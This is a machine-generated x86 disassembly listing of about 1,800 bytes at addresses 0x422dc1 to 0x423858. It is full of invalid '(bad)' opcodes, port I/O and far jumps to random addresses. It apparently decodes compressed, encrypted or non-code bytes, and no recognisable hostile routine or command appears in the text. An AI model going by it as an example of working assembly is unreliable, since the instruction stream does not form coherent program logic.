  422dc1:	(bad)  [ecx]
  422dc3:	sbb    eax,0x96d34a0b
  422dc8:	loop   0x422df8
  422dca:	add    ebp,ebx
  422dcc:	dec    ecx
  422dcd:	jmp    0x422d85
  422dcf:	(bad)  
  422dd0:	pop    eax
  422dd1:	ins    DWORD PTR es:[edi],dx
  422dd2:	adc    dh,0x9a
  422dd5:	ins    DWORD PTR es:[edi],dx
  422dd6:	imul   esi,DWORD PTR [ecx-0x64c8e266],0x1a0e21bc
  422de0:	pop    ss
  422de1:	imul   ebp,DWORD PTR [eax],0xffffffc5
  422de4:	arpl   WORD PTR [edx+0x1a7a3482],cx
  422dea:	sub    eax,0xf53bbc60
  422def:	aas    
  422df0:	and    DWORD PTR [esi],edi
  422df2:	ins    BYTE PTR es:[edi],dx
  422df3:	(bad)  ds:0xf15d968d
  422df9:	test   al,0x5b
  422dfb:	in     al,dx
  422dfc:	inc    esi
  422dfd:	pop    ss
  422dfe:	retf   0x16
  422e01:	pop    eax
  422e02:	(bad)  
  422e03:	adc    al,0xe1
  422e05:	(bad)  
  422e06:	jns    0x422e72
  422e08:	(bad)  
  422e0a:	(bad)  
  422e0c:	or     eax,0x99623a44
  422e11:	mov    esi,0x4abccc52
  422e16:	xchg   esp,eax
  422e17:	cmp    BYTE PTR ds:0xbebbd871,0x7f
  422e1e:	frstor [ebx-0x6a]
  422e21:	push   eax
  422e22:	mov    ebx,0xcbfbdd4
  422e27:	out    0xcd,al
  422e29:	out    0xd3,al
  422e2b:	jae    0x422de5
  422e2d:	aad    0x1
  422e2f:	sti    
  422e30:	shr    BYTE PTR [eax],0x49
  422e33:	fwait
  422e34:	push   0x20
  422e36:	mov    ds:0x11d2a51c,eax
  422e3b:	(bad)  
  422e3c:	push   cs
  422e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e3e:	ss (bad) 
  422e41:	lods   eax,DWORD PTR ds:[esi]
  422e42:	push   edi
  422e43:	ins    BYTE PTR es:[edi],dx
  422e44:	in     eax,dx
  422e45:	pop    edi
  422e46:	push   ds
  422e47:	cmp    DWORD PTR [esi],esi
  422e49:	jmp    0x2f0b40ab
  422e4e:	pop    ebx
  422e4f:	test   DWORD PTR [eax-0x17],0xaa50f2d3
  422e56:	jg     0x422df7
  422e58:	fsub   QWORD PTR [esi-0x5e]
  422e5b:	je     0x422e79
  422e5d:	lock stc 
  422e5f:	jno    0x422ea8
  422e61:	xor    esi,DWORD PTR [ecx]
  422e63:	ja     0x422ebc
  422e65:	xchg   ebx,eax
  422e66:	scas   eax,DWORD PTR es:[edi]
  422e67:	push   cs
  422e68:	test   DWORD PTR ds:0x87733cbd,esp
  422e6e:	ret    0x999d
  422e71:	inc    ecx
  422e72:	pop    ss
  422e73:	inc    edx
  422e74:	push   edx
  422e75:	mov    ds:0x70277c7e,eax
  422e7a:	jne    0x422e87
  422e7c:	push   ss
  422e7d:	xchg   ebx,eax
  422e7e:	add    dl,BYTE PTR [edi+0x3e]
  422e81:	sbb    DWORD PTR ds:0x2b7229f1,0x6b
  422e88:	inc    edx
  422e89:	jae    0x422e0c
  422e8b:	sbb    ebp,ebp
  422e8d:	inc    ebp
  422e8e:	and    BYTE PTR [edi+0x0],ch
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0x81f2
  422f02:	popf   
  422f03:	mov    ds:0x1745c,al
  422f08:	add    al,0x1
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	xchg   BYTE PTR [ecx],bh
  422f0e:	out    0x89,eax
  422f10:	inc    edi
  422f11:	pop    ecx
  422f12:	and    eax,0x97faf763
  422f17:	repnz test al,0xcf
  422f1a:	cmp    al,BYTE PTR [eax+0x17]
  422f1d:	into   
  422f1e:	jecxz  0x422f60
  422f20:	pop    esp
  422f21:	sti    
  422f22:	pop    esi
  422f23:	out    0xc,eax
  422f25:	add    BYTE PTR [edi-0x6f],0xf2
  422f29:	repz mov edx,0xc10b5b36
  422f2f:	and    DWORD PTR [edx-0x5be7a9c3],ebx
  422f35:	adc    BYTE PTR [edi-0x1],ch
  422f38:	das    
  422f39:	adc    al,0xec
  422f3b:	bnd jp 0x422fae
  422f3e:	ins    BYTE PTR es:[edi],dx
  422f3f:	(bad)  [ebx-0x3c]
  422f42:	data16 jl 0x422f13
  422f45:	sub    al,bl
  422f47:	jae    0x422f1e
  422f49:	arpl   WORD PTR [edx-0x2b8def94],bp
  422f4f:	ror    BYTE PTR [esi],0x9
  422f52:	rcl    DWORD PTR [ebx],cl
  422f54:	fxch   st(7)
  422f56:	jge    0x422fd0
  422f58:	cli    
  422f59:	mov    dl,BYTE PTR [ecx+0x5ee25559]
  422f5f:	inc    ebx
  422f60:	xor    eax,0x67ec7110
  422f65:	iret   
  422f66:	xor    al,BYTE PTR [eax]
  422f68:	mov    al,ds:0x87e690fc
  422f6d:	pop    ss
  422f6e:	push   ecx
  422f6f:	and    ebx,DWORD PTR [eax+0x69]
  422f72:	in     eax,0xa7
  422f74:	loop   0x422f75
  422f76:	inc    esp
  422f77:	loop   0x422fe4
  422f79:	loope  0x422f87
  422f7b:	into   
  422f7c:	adc    eax,0xe1f82a01
  422f81:	ss add al,0x65
  422f84:	push   ebp
  422f85:	and    bh,bl
  422f87:	mov    esp,DWORD PTR [edi]
  422f89:	ficom  WORD PTR [edi+0x25]
  422f8c:	jnp    0x422f52
  422f8e:	dec    ebx
  422f8f:	xor    DWORD PTR [esi],edi
  422f91:	loope  0x42300c
  422f93:	in     al,0xfd
  422f95:	adc    BYTE PTR [edi],bh
  422f97:	aas    
  422f98:	out    0xd6,al
  422f9a:	out    0x9e,al
  422f9c:	and    al,0x67
  422f9e:	in     al,0x14
  422fa0:	xor    DWORD PTR [ebx],ebp
  422fa2:	push   cs
  422fa3:	rdpmc  
  422fa5:	leave  
  422fa6:	(bad)  
  422fa7:	fistp  DWORD PTR [eax+0x3264cf8c]
  422fad:	fs stos DWORD PTR es:[edi],eax
  422faf:	add    edi,DWORD PTR [ebx-0x77]
  422fb2:	and    ah,BYTE PTR [ecx-0x5481459]
  422fb8:	ins    BYTE PTR es:[edi],dx
  422fb9:	jp     0x422fbd
  422fbb:	pop    es
  422fbc:	or     al,0xda
  422fbe:	jmp    0x422f6f
  422fc0:	je     0x422f42
  422fc2:	or     DWORD PTR [ebp+0x2166160a],ebx
  422fc8:	movsx  edi,BYTE PTR [eax+eax*4-0x16ce960]
  422fd0:	les    ax,DWORD PTR [esi]
  422fd3:	jl     0x422fa7
  422fd5:	fsubr  DWORD PTR [edi]
  422fd7:	(bad)  
  422fd8:	jmp    0x62f7:0x216dc332
  422fdf:	sbb    eax,0x3983256c
  422fe4:	cmc    
  422fe5:	mov    al,ds:0x199921fd
  422fea:	adc    DWORD PTR [edi+0x58],ebx
  422fed:	lds    esp,FWORD PTR [edi+0x7df7d6a0]
  422ff3:	(bad)  
  422ff5:	mov    dl,0x3
  422ff7:	dec    ebx
  422ff8:	jne    0x423021
  422ffa:	test   BYTE PTR [edi+0x5c],ch
  422ffd:	sub    eax,0xca63b9b4
  423002:	mov    dh,0x7e
  423004:	(bad)  
  423005:	(bad)  
  423007:	add    cl,cl
  423009:	test   eax,0x2a2dfb18
  42300e:	xchg   ecx,eax
  42300f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [edi+eax*8+0x6047b640],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	and    BYTE PTR [edx+0x11],dl
  42308f:	aaa    
  423090:	arpl   WORD PTR [edx-0x13],sp
  423093:	mov    cl,0xec
  423095:	and    esi,esi
  423097:	adc    ebx,DWORD PTR [ecx-0x3e5cda97]
  42309d:	push   0x4c70e9d6
  4230a2:	jae    0x4230f8
  4230a4:	push   ebx
  4230a5:	dec    ebp
  4230a6:	mov    ?,edi
  4230a8:	jmp    0x6e585b90
  4230ad:	pop    eax
  4230ae:	jecxz  0x42312b
  4230b0:	mov    gs,WORD PTR [eax+0xb77f45c]
  4230b6:	ja     0x4230da
  4230b8:	push   ebx
  4230b9:	dec    dl
  4230bb:	sbb    al,0xaf
  4230bd:	jge    0x423108
  4230bf:	mov    ds:0xbbaae373,eax
  4230c4:	jns    0x423053
  4230c6:	loop   0x42307b
  4230c8:	lods   eax,DWORD PTR es:[esi]
  4230ca:	xchg   BYTE PTR [ecx-0x29],ch
  4230cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230ce:	addr16 push ecx
  4230d0:	pop    edx
  4230d1:	mov    ch,0x49
  4230d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230d4:	ficomp WORD PTR [ebp+0x463fb663]
  4230da:	jb     0x42309f
  4230dc:	sbb    esp,DWORD PTR [eax-0x47]
  4230df:	(bad)  
  4230e0:	mov    al,0xa5
  4230e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230e3:	sbb    eax,0xc3e71cfa
  4230e8:	jno    0x423089
  4230ea:	pop    edx
  4230eb:	mov    ch,0xdf
  4230ed:	popa   
  4230ee:	fsub   DWORD PTR [edi]
  4230f0:	ja     0x423081
  4230f2:	leave  
  4230f3:	sub    edi,DWORD PTR [eax-0x46f88ad1]
  4230f9:	dec    ecx
  4230fa:	ds xor al,0xf0
  4230fd:	psubw  mm4,QWORD PTR [eax-0x79]
  423101:	adc    bh,BYTE PTR [esi-0x67]
  423104:	xor    al,0xd9
  423106:	pop    ss
  423107:	xor    al,0x92
  423109:	jbe    0x4230ce
  42310b:	fwait
  42310c:	mov    ah,0x25
  42310e:	or     dl,BYTE PTR ds:0xc66ea4f1
  423114:	dec    ebp
  423115:	cmp    BYTE PTR [esi],cl
  423117:	mov    ecx,0x56306ce6
  42311c:	mov    al,ds:0xcadb2520
  423121:	push   ebp
  423122:	and    eax,0x2df7a6dc
  423127:	imul   eax,DWORD PTR [esi+0x6fc87cca],0x48103dd9
  423131:	cmp    eax,0x17b8bd55
  423136:	jge    0x423104
  423138:	es (bad) 
  42313a:	mov    esi,0x120960c
  42313f:	sbb    BYTE PTR [edi],0x6a
  423142:	sti    
  423143:	jns    0x42313a
  423145:	mov    BYTE PTR [ecx-0x25263f19],dl
  42314b:	fst    QWORD PTR [edx-0x3c]
  42314e:	xlat   BYTE PTR ds:[ebx]
  42314f:	mov    eax,ds:0x6737d660
  423154:	imul   ebx,DWORD PTR [ebp*8+0xff13c1e],0xf530e03e
  42315f:	popf   
  423160:	mov    DWORD PTR ds:[ebp+0x1f],esp
  423164:	jecxz  0x4231d3
  423166:	fld    QWORD PTR [eax+0x1030cda8]
  42316c:	xbegin 0xc5b4fba9
  423172:	push   es
  423173:	mov    ebx,0x16b408d8
  423178:	leave  
  423179:	aas    
  42317a:	mov    al,0xad
  42317c:	push   esi
  42317d:	les    edi,FWORD PTR [ecx-0x3292c33]
  423183:	add    esi,0xc65d247f
  423189:	mov    dh,0x2c
  42318b:	stos   DWORD PTR es:[edi],eax
  42318c:	fxch   st(0)
  42318e:	jmp    0x0:0x92
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x59f474fd],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	das    
  42320d:	shl    DWORD PTR [ebx-0xd4f2c6e],cl
  423213:	stos   DWORD PTR es:[edi],eax
  423214:	mov    al,0x92
  423216:	mov    al,0xcc
  423218:	fwait
  423219:	test   BYTE PTR [ecx+0x302ae0c0],bl
  42321f:	inc    edx
  423220:	imul   DWORD PTR [ebp+ebp*8-0x50087cb5]
  423227:	imul   eax,DWORD PTR [esp+ecx*8+0x7f70b5a9],0x6c
  42322f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423230:	leave  
  423231:	out    dx,eax
  423232:	jno    0x423294
  423234:	mov    dl,0xd
  423236:	ret    
  423237:	cmp    al,0x32
  423239:	xor    al,0x59
  42323b:	cmp    al,0x94
  42323d:	xchg   BYTE PTR [edi+eiz*1+0x60750b4],dl
  423244:	cmp    bh,BYTE PTR [edx+0x7a70dc61]
  42324a:	sbb    DWORD PTR [ebx],eax
  42324c:	pusha  
  42324d:	lock jns 0x423220
  423250:	mov    edi,ss
  423252:	dec    edi
  423253:	mov    ds:0x93b021be,al
  423258:	pushf  
  423259:	sub    bl,0xed
  42325c:	inc    edx
  42325d:	jmp    0x97e4030b
  423262:	ret    
  423263:	cli    
  423264:	mov    ebp,0xdc8190b7
  423269:	cli    
  42326a:	mov    esp,0x6deeafe5
  42326f:	je     0x4232bb
  423271:	ins    DWORD PTR es:[edi],dx
  423272:	inc    edi
  423273:	ja     0x42328d
  423275:	mov    DWORD PTR [esi+0x7e767706],ebp
  42327b:	jmp    0xdaa9c196
  423280:	xchg   BYTE PTR [ebx-0x2a],dh
  423283:	xchg   ebx,eax
  423284:	outs   dx,BYTE PTR ds:[esi]
  423285:	xor    al,0xcc
  423287:	rcl    DWORD PTR [edx+0x71],cl
  42328a:	jg     0x42328d
  42328c:	add    eax,0xd83b7717
  423291:	out    dx,al
  423292:	xchg   BYTE PTR [esi+0x30],ch
  423295:	out    dx,eax
  423296:	mov    ds:0x103c62de,eax
  42329b:	jbe    0x4232a8
  42329d:	inc    esi
  42329e:	mov    ss,WORD PTR [eax]
  4232a0:	mov    bl,BYTE PTR [di-0x7d]
  4232a4:	repnz and DWORD PTR [edx],esp
  4232a7:	(bad)  
  4232a8:	stos   BYTE PTR es:[edi],al
  4232a9:	push   0xd8b15e8
  4232ae:	add    BYTE PTR [ecx],dl
  4232b0:	enter  0xabe7,0x8c
  4232b4:	cmp    eax,0x8999c1ed
  4232b9:	xchg   ebx,eax
  4232ba:	stos   DWORD PTR es:[edi],eax
  4232bb:	je     0x423280
  4232bd:	inc    ebp
  4232be:	inc    eax
  4232bf:	inc    esi
  4232c0:	pop    esi
  4232c1:	js     0x4232a7
  4232c3:	fsub   st(2),st
  4232c5:	mov    eax,ebx
  4232c7:	arpl   WORD PTR [ecx],dx
  4232c9:	xchg   ecx,eax
  4232ca:	dec    esi
  4232cb:	xchg   edi,eax
  4232cc:	cli    
  4232cd:	or     dl,BYTE PTR [esi-0x76]
  4232d0:	fisubr DWORD PTR [ebx]
  4232d2:	adc    esp,0x43
  4232d5:	fild   QWORD PTR [edi-0xcb33bde]
  4232db:	dec    ebx
  4232dc:	stc    
  4232dd:	mov    ds:0xf867d894,al
  4232e2:	mov    dl,0xb8
  4232e4:	sar    BYTE PTR [ebp-0x684cdbe7],cl
  4232ea:	push   esi
  4232eb:	pusha  
  4232ec:	mov    bl,0x93
  4232ee:	fs pop esp
  4232f0:	cmp    al,0x5f
  4232f2:	jns    0x4232bc
  4232f4:	push   ds
  4232f5:	gs test ch,dh
  4232f8:	push   DWORD PTR [ecx+0x56a9e95f]
  4232fe:	lock jge 0x4232bd
  423301:	sub    DWORD PTR [edi-0x680c8090],eax
  423307:	push   ebp
  423308:	es mov eax,0xde49cf35
  42330e:	push   0xffffff9b
	...
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xb4f00f44
  423382:	push   esi
  423383:	and    eax,0x17768
  423388:	add    al,0x1
  42338a:	add    BYTE PTR [eax],al
  42338c:	mov    edi,0x34708633
  423391:	dec    esi
  423392:	jb     0x423366
  423394:	pusha  
  423395:	mov    DWORD PTR [eax-0x78],edx
  423398:	adc    ebx,DWORD PTR [esi-0x34434690]
  42339e:	mov    ecx,0x249a9ab2
  4233a3:	sub    edx,DWORD PTR [ecx]
  4233a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233a6:	cmp    al,0x21
  4233a8:	push   edi
  4233a9:	jp     0x42341a
  4233ab:	fnstenv [esi-0x54]
  4233ae:	jp     0x42336a
  4233b0:	and    al,0x4
  4233b2:	dec    eax
  4233b3:	mov    dl,0x81
  4233b5:	ds cld 
  4233b7:	sbb    ah,dh
  4233b9:	xchg   ecx,eax
  4233ba:	mov    al,0x6b
  4233bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233bd:	test   BYTE PTR [ebx+0x74418218],ah
  4233c3:	stos   BYTE PTR es:[edi],al
  4233c4:	jnp    0x4233b0
  4233c6:	test   DWORD PTR [ebp+0xe44755e],0x6296d651
  4233d0:	fisttp QWORD PTR [edx]
  4233d2:	lea    edx,[ebx-0x5d4715b0]
  4233d8:	dec    ebp
  4233d9:	stos   BYTE PTR es:[edi],al
  4233da:	add    al,0xa5
  4233dc:	cmp    al,0x6c
  4233de:	sbb    DWORD PTR [edx+eiz*8+0x25],0xffffffe3
  4233e3:	mov    BYTE PTR [edi+ebx*2-0x61],0x84
  4233e8:	xor    al,0x6d
  4233ea:	leave  
  4233eb:	pusha  
  4233ec:	not    BYTE PTR [ebx+0x6c2310f9]
  4233f2:	clc    
  4233f3:	fmul   st,st(4)
  4233f5:	xor    eax,0x49afdb82
  4233fa:	iret   
  4233fb:	pop    es
  4233fc:	test   BYTE PTR ds:0x72316849,bl
  423402:	aam    0x58
  423404:	inc    eax
  423405:	jo     0x423470
  423407:	push   ecx
  423408:	pop    ebx
  423409:	pop    ebp
  42340a:	popf   
  42340b:	xchg   DWORD PTR [ebx],ebp
  42340d:	sbb    edx,DWORD PTR ds:0x9308692f
  423413:	sbb    al,0x4f
  423415:	xor    ch,BYTE PTR [edx+0x47dd5ae0]
  42341b:	dec    esi
  42341c:	in     al,dx
  42341d:	adc    al,0xf4
  42341f:	mov    cl,0x23
  423421:	hlt    
  423422:	push   ebp
  423423:	mov    ecx,0x18ac750f
  423428:	shl    BYTE PTR [eax+0x7],1
  42342b:	mov    bl,0xb2
  42342d:	iret   
  42342e:	jecxz  0x423490
  423430:	ret    0xa94
  423433:	(bad)  
  423434:	sahf   
  423435:	xor    ebp,ebp
  423437:	xchg   ecx,eax
  423438:	es addr16 jg 0x423420
  42343c:	push   ebp
  42343d:	push   ebx
  42343e:	and    ch,BYTE PTR [ebp-0x48e6149c]
  423444:	adc    bl,BYTE PTR [ebp-0x2e]
  423447:	pop    es
  423448:	inc    ebx
  423449:	call   0x8bc:0x926d6105
  423450:	pop    edx
  423451:	pop    edi
  423452:	stos   BYTE PTR es:[edi],al
  423453:	cmp    al,0xc7
  423455:	xchg   edi,eax
  423456:	pop    esp
  423457:	into   
  423458:	inc    edx
  423459:	fidiv  DWORD PTR [edi]
  42345b:	mov    eax,ds:0x3c696c15
  423460:	or     edx,DWORD PTR [eax+esi*4]
  423463:	mov    al,0xe
  423465:	test   eax,0x3291eb76
  42346a:	cmc    
  42346b:	mov    edi,0x2ffcea98
  423470:	xor    eax,0x89874a33
  423475:	sub    eax,0x708cd440
  42347a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42347b:	adc    eax,0xa1033ae4
  423480:	push   0x70
  423482:	fsubp  st(3),st
  423484:	outs   dx,DWORD PTR ds:[esi]
  423485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423487:	add    eax,0xda60b36b
  42348c:	xchg   ecx,ebx
  42348e:	xchg   ebx,eax
  42348f:	sub    al,0x0
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0xbf1f:0xadf467bf
  423501:	mov    eax,0x786c3f57
  423506:	add    DWORD PTR [eax],eax
  423508:	add    al,0x1
  42350a:	add    BYTE PTR [eax],al
  42350c:	stos   DWORD PTR es:[edi],eax
  42350d:	xchg   esp,eax
  42350e:	inc    esp
  42350f:	icebp  
  423510:	mov    edx,0xc99f2cc8
  423515:	popf   
  423516:	aaa    
  423517:	mov    dl,0x54
  423519:	xor    dh,0xb
  42351c:	mov    ebx,0xdfcf2ee3
  423521:	je     0x4234a3
  423523:	sub    DWORD PTR ds:0x827e1c49,esi
  423529:	mov    ecx,0x402ffedb
  42352e:	mov    al,0x14
  423530:	cld    
  423531:	add    eax,0x8580214b
  423536:	mov    eax,0xf16a6485
  42353b:	jne    0x423550
  42353d:	mov    ds:0x79b26750,al
  423542:	xchg   ecx,eax
  423543:	(bad)  
  423544:	mul    edi
  423546:	ret    
  423547:	sub    eax,0xd2983399
  42354c:	lods   eax,DWORD PTR ds:[esi]
  42354d:	iret   
  42354e:	sbb    DWORD PTR [esi+ecx*1+0x209f1296],esp
  423555:	fxtract 
  423557:	cmp    eax,0x59b31d73
  42355c:	mov    esi,0x43b4b365
  423561:	mov    edx,DWORD PTR [ebx]
  423563:	xor    al,0xcf
  423565:	xchg   ebx,eax
  423566:	lahf   
  423567:	test   eax,0x20f2f1ee
  42356c:	pop    es
  42356d:	stos   BYTE PTR es:[edi],al
  42356e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42356f:	cmp    ch,BYTE PTR [edi]
  423571:	enter  0x8e9e,0x2e
  423575:	aad    0x52
  423577:	aas    
  423578:	icebp  
  423579:	jmp    0xe0155e08
  42357e:	jecxz  0x42358e
  423580:	cmp    DWORD PTR [edi-0x48bd26ee],ebx
  423586:	repz ds mov eax,cs:0x2e1969c9
  42358e:	fdivr  DWORD PTR [ebp+0x38]
  423591:	sub    dl,bl
  423593:	aaa    
  423594:	pop    edx
  423595:	mov    edi,0x633f8a2a
  42359a:	call   0x62d2:0x6c457650
  4235a1:	ja     0x42355e
  4235a3:	add    DWORD PTR [esi+esi*2+0x4b],edx
  4235a7:	and    DWORD PTR [ebp+0x53],esp
  4235aa:	retf   
  4235ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235ac:	shl    BYTE PTR [edx],cl
  4235ae:	stos   BYTE PTR es:[edi],al
  4235af:	icebp  
  4235b0:	ds scas eax,DWORD PTR es:[edi]
  4235b2:	mov    ch,0xfa
  4235b4:	xchg   esi,eax
  4235b5:	xor    esi,DWORD PTR [esi]
  4235b7:	dec    ecx
  4235b8:	cli    
  4235b9:	or     ebp,ecx
  4235bb:	lock mov ds:0xda940f77,al
  4235c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235c2:	pusha  
  4235c3:	sub    bh,BYTE PTR [ecx+0x27]
  4235c6:	cmc    
  4235c7:	call   0xb71a:0x3fde464a
  4235ce:	das    
  4235cf:	mov    ds:0xc0b0f5ff,eax
  4235d4:	mov    esp,0xa4295797
  4235d9:	iret   
  4235da:	dec    ecx
  4235db:	jecxz  0x423630
  4235dd:	nop
  4235de:	xchg   ebx,eax
  4235df:	dec    eax
  4235e0:	(bad)  
  4235e1:	xchg   ebx,eax
  4235e2:	loop   0x4235e9
  4235e4:	pusha  
  4235e5:	or     bl,BYTE PTR [ebp+0x27e987e5]
  4235eb:	clc    
  4235ec:	je     0x42362e
  4235ee:	mov    esp,DWORD PTR [edx]
  4235f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235f1:	lds    edi,FWORD PTR [edx-0x25]
  4235f4:	mov    ebp,0x1176964a
  4235f9:	scas   al,BYTE PTR es:[edi]
  4235fa:	add    BYTE PTR [eax],al
  4235fc:	jbe    0x42359f
  4235fe:	lock or DWORD PTR [eax],0xffffffdd
  423602:	push   ss
  423603:	mov    eax,ds:0x41cd2856
  423608:	ins    BYTE PTR es:[edi],dx
  423609:	repz jg 0x42367e
  42360c:	int    0x6f
  42360e:	bound  ebp,QWORD PTR [eax+0x0]
	...
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	push   ds
  423681:	out    dx,eax
  423682:	ins    DWORD PTR es:[edi],dx
  423683:	addr16 jo 0x4236ff
  423686:	add    DWORD PTR [eax],eax
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	jmp    0x423676
  42368e:	xchg   esi,eax
  42368f:	mov    edi,0xe202295b
  423694:	fwait
  423695:	add    al,BYTE PTR [esi]
  423697:	sub    ebx,esp
  423699:	add    cl,ch
  42369b:	pop    es
  42369c:	fnsave [ebx]
  42369e:	loope  0x4236db
  4236a0:	(bad)  
  4236a1:	xor    ecx,ebp
  4236a3:	jns    0x4236bf
  4236a5:	push   esi
  4236a6:	icebp  
  4236a7:	ss cwde 
  4236a9:	loop   0x42369c
  4236ab:	in     eax,dx
  4236ac:	outs   dx,DWORD PTR ds:[esi]
  4236ad:	fdiv   DWORD PTR [esi+0x3bf1aace]
  4236b3:	pop    ebx
  4236b4:	adc    DWORD PTR ds:0x86745d42,ebp
  4236ba:	test   DWORD PTR [eax+ebx*2+0x4c2cddc],esp
  4236c1:	inc    ebp
  4236c2:	imul   edx,DWORD PTR [eax-0x4c],0xffffffed
  4236c6:	mov    ds:0x55628011,al
  4236cb:	xchg   dh,ah
  4236cd:	fisub  WORD PTR [ebx]
  4236cf:	add    eax,DWORD PTR [eax]
  4236d1:	and    DWORD PTR [bp+si],ebp
  4236d4:	adc    ebx,DWORD PTR [ecx]
  4236d6:	rcl    DWORD PTR [esi+0x25646b75],0x45
  4236dd:	rol    bh,1
  4236df:	and    esi,DWORD PTR [eax-0x71415d8e]
  4236e5:	call   0xdf1296ab
  4236ea:	xor    BYTE PTR [ebx+ebp*2+0x566e8cd9],bh
  4236f1:	dec    ebp
  4236f2:	rep stos DWORD PTR es:[edi],eax
  4236f4:	call   0xac9df4be
  4236f9:	dec    esi
  4236fa:	cmp    BYTE PTR [edi],ch
  4236fc:	(bad)  
  4236fd:	rol    DWORD PTR [ebx+0xa],1
  423700:	and    DWORD PTR [esi-0x59],edi
  423703:	push   ss
  423704:	setne  BYTE PTR [ecx]
  423707:	mov    bl,0x7e
  423709:	call   0xe71e:0x24e292ee
  423710:	fadd   QWORD PTR [edx+0x62]
  423713:	cld    
  423714:	or     BYTE PTR [ebp+0x600e6583],dl
  42371a:	jecxz  0x42374f
  42371c:	pop    es
  42371d:	shl    dh,0x4a
  423720:	mov    DWORD PTR [eax+edi*1],esi
  423723:	std    
  423724:	cmp    eax,DWORD PTR [edi]
  423726:	jmp    0x42375a
  423728:	stos   BYTE PTR es:[edi],al
  423729:	mov    edx,ss
  42372b:	mov    ebp,0x79703644
  423730:	pop    ds
  423731:	mov    al,0x9e
  423733:	inc    bh
  423735:	cmp    esi,DWORD PTR [eax+0x1f5e0abe]
  42373b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42373c:	push   edx
  42373d:	xor    DWORD PTR [eax+0x4b9e5290],edx
  423743:	into   
  423744:	and    BYTE PTR [ebx-0x26554059],dl
  42374a:	repnz scas eax,DWORD PTR es:[edi]
  42374c:	mov    DWORD PTR [ebx+0x5b],esi
  42374f:	je     0x4236fe
  423751:	loope  0x423757
  423753:	popa   
  423754:	push   ebx
  423755:	dec    eax
  423756:	xchg   edi,eax
  423757:	sbb    BYTE PTR [eax+ebx*2+0x62cba7ed],al
  42375e:	cmp    eax,0x9f83f914
  423763:	add    eax,0x13f0555
  423768:	jns    0x4236f8
  42376a:	inc    ebx
  42376b:	xchg   BYTE PTR [esi],bh
  42376d:	retf   
  42376e:	fistp  DWORD PTR [esi]
  423770:	ja     0x423740
  423772:	push   edx
  423773:	pop    eax
  423774:	popf   
  423775:	loop   0x42379d
  423777:	(bad)  
  423778:	mov    ecx,0x5a9ae35d
  42377d:	sbb    DWORD PTR [eax-0x53],0xfffffff6
  423781:	mov    eax,ds:0x8c8d0dc2
  423786:	push   0xefff89b3
  42378b:	lock pushf 
  42378d:	xchg   eax,edi
  42378f:	sub    eax,DWORD PTR [eax]
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0xf2bb7100
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	and    ch,bh
  42380e:	push   edi
  42380f:	out    0xca,eax
  423811:	cwde   
  423812:	mov    ds:0xfcdc4635,al
  423817:	add    esp,DWORD PTR [edx]
  423819:	xor    al,0x50
  42381b:	out    dx,al
  42381c:	sbb    esi,DWORD PTR [ebp-0x5c]
  42381f:	pusha  
  423820:	cwde   
  423821:	sub    ecx,DWORD PTR [ebp-0x22]
  423824:	imul   eax,DWORD PTR [eax+ebp*2+0x6916491a],0x210893e0
  42382f:	js     0x423859
  423831:	lods   al,BYTE PTR ds:[esi]
  423832:	cli    
  423833:	das    
  423834:	xor    bh,BYTE PTR ds:0x94c80d2b
  42383a:	ds dec ecx
  42383c:	add    eax,0xfe8882c8
  423841:	sub    BYTE PTR [esi+0x7ea5e3ab],al
  423847:	mov    bl,0xd
  423849:	cli    
  42384a:	dec    ecx
  42384b:	sahf   
  42384c:	cmp    BYTE PTR [ebp+edi*1-0x7e922b00],0x54
  423854:	mov    cl,BYTE PTR [bp+di+0x2e]
  423858:	in     eax,0x8b
